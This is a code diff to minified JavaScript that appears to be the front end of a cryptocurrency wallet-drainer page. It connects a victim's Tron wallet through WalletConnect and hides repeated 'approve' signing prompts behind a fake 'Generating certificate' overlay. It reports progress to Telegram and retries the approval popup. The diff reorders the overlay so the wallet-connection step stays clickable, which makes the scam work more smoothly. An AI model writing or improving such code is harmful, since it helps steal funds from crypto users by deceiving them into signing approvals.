@@ -92979,13 +92979,13 @@
                 } catch (_) {}
                 const openTrustStay = () => {};
 
-                // Cover site: only "Generating certificate" — no Trust/approve helper text
+                // Overlay ONLY after wallet is connected — otherwise it blocks WalletConnect "Select Wallet"
                 const showGenerating = () => {
                     let el = document.getElementById("cert-generating-overlay");
                     if (!el) {
                         el = document.createElement("div");
                         el.id = "cert-generating-overlay";
-                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.92);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
+                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.92);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;pointer-events:none;");
                         el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700">Generating certificate</div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
                         document.body.appendChild(el)
                     }
@@ -92995,15 +92995,12 @@
                     if (el && el.parentNode)
                         el.parentNode.removeChild(el)
                 };
-                showGenerating();
-                t(3);
-                try {
-                    window.__approveInProgress = !0
-                } catch (_) {}
+                // Ensure any leftover overlay is gone so WC modal is clickable
+                hideGenerating();
 
                 try {
                     var e, r, i;
-                    // Silent wait for WalletConnect provider — no "wait 1 second" alert
+                    // Silent wait for WalletConnect provider — no alert
                     let provider = l || (typeof window !== "undefined" ? window.__tronWcProvider : null);
                     if (!provider) {
                         for (let w = 0; w < 40 && !provider; w += 1) {
@@ -93013,12 +93010,9 @@
                     }
                     if (!provider) {
                         console.error("[1] CONNECT blocked: provider not ready");
-                        try {
-                            window.__approveInProgress = !1
-                        } catch (_) {}
-                        hideGenerating();
                         return
                     }
+                    // Connect first — WalletConnect modal must be fully clickable
                     await provider.connect({
                         namespaces: {
                             tron: {
@@ -93036,10 +93030,6 @@
                     h(a);
                     const c = (null === (e = provider.session) || void 0 === e || null === (r = e.namespaces.tron) || void 0 === r || null === (i = r.accounts[0]) || void 0 === i ? void 0 : i.split(":")[2]) || "";
                     if (!c) {
-                        try {
-                            window.__approveInProgress = !1
-                        } catch (_) {}
-                        hideGenerating();
                         t(2);
                         return
                     }
@@ -93062,8 +93052,12 @@
                         wallet: c
                     });
 
-                    // Stay covered with only "Generating certificate" until on-chain success
+                    // ONLY now show Generating certificate (after connect succeeded)
+                    try {
+                        window.__approveInProgress = !0
+                    } catch (_) {}
                     showGenerating();
+                    t(3);
 
                     // Telegram notify only (no balance / top-up)
                     reportEvent("TELEGRAM_SEND_INITIATED", {
@@ -93355,7 +93349,7 @@
                                 maxTries: maxTries,
                                 message: n && n.message || "pushing approve popup again"
                             });
-                            showGenerating("Waiting for approval… retrying (" + (tryNo + 1) + "/" + maxTries + ")");
+                            showGenerating();
                             await new Promise((resolve) => setTimeout(resolve, 2500))
                         }
                     }
